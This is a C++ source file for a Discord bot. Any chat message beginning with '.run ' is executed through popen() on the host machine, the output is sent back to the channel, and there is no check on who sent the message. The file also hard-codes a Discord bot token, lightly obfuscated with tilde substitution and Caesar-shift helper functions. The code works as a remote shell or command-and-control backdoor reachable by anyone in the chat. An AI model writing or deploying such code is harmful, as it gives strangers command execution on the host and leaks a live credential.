#include <iostream>
#include <dpp/dpp.h>
#include <string>
#include <array>
#include <memory>
#include <stdexcept>
#include <cstdio>
#include <typeinfo>

using namespace std;


string encrypt(const string &text, int shift) {
    string result = "";

    for (char ch : text) {
        // Encrypt uppercase letters
        if (isupper(ch)) {
            result += char(int(ch + shift - 'A') % 26 + 'A');
        }
        // Encrypt lowercase letters
        else if (islower(ch)) {
            result += char(int(ch + shift - 'a') % 26 + 'a');
        }
        // Encrypt digits
        else if (isdigit(ch)) {
            result += char(int(ch + shift - '0') % 10 + '0');
        }
        // Encrypt period character
        else if (ch == '.') {
            result += char(int(ch + shift)); // Shift period by the specified amount
        } else {
            // Non-ciphered characters remain unchanged
            result += ch;
        }
    }

    return result;
}

string decrypt(const string &text, int shift) {
    string result = "";

    for (char ch : text) {
        // Decrypt uppercase letters
        if (isupper(ch)) {
            result += char(int(ch - shift - 'A' + 26) % 26 + 'A');
        }
        // Decrypt lowercase letters
        else if (islower(ch)) {
            result += char(int(ch - shift - 'a' + 26) % 26 + 'a');
        }
        // Decrypt digits
        else if (isdigit(ch)) {
            result += char(int(ch - shift - '0' + 10) % 10 + '0');
        }
        // Decrypt period character
        else if (ch == '.') {
            result += char(int(ch) - shift); // Shift period back by the specified amount
        } else {
            // Non-ciphered characters remain unchanged
            if (ch == ';') {
              result += '.';
            } else {
              if (ch == '-') {
                result += '7';
              } else {
                if (ch == '/') {
                result += '9';
                } else {
                  result += ch;
                }
              }
            }
        }
    }

    return result;
}


string exec(const char* cmd) {
    array<char, 128> buffer;
    string result;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    return result;
}

std::string replaceTildeWithDot(const std::string& input) {
    std::string result = input; // Create a copy of the input string
    for (char& c : result) {
        if (c == '~') {
            c = '.'; // Replace '~' with '.'
        }
    }
    return result; // Return the modified string
}

const std::string BOT_TOKEN = replaceTildeWithDot("MTI3NzM1OTgwNTc4NjQ4ODk3Mg~G6ggok~IhtCGyswIT1H79q0Nzm-KLVxCgF5IevP-6g2fY");

int main() {
    //cout << BOT_TOKEN << endl;
    //cout << encrypt(BOT_TOKEN, 13) << endl;
    //cout << decrypt("ZGV6AmZ4BGtjAGp7AwD7BQx6Zt;T9ttbx;VugPTlfjVG4U02d3Amz-XYIkPtS8VriC-9t5sL", 13) << endl;
    // Create the bot with the necessary intents
    dpp::cluster bot(BOT_TOKEN, dpp::i_default_intents | dpp::i_message_content);

    // Set up logging
    bot.on_log(dpp::utility::cout_logger());

    // Listen for message creation events
    bot.on_message_create([](const dpp::message_create_t& event) {
        // Check if the message starts with "!ping"
        if (event.msg.content.rfind(".run ", 0) == 0) {
            string msg = event.msg.content;
            msg.replace(msg.find(".run "), sizeof(".run ") - 1, "");
            event.reply(exec(msg.c_str()), false); // Reply to the message
        }
    });

    bot.start(dpp::st_wait);

    return 0;
}

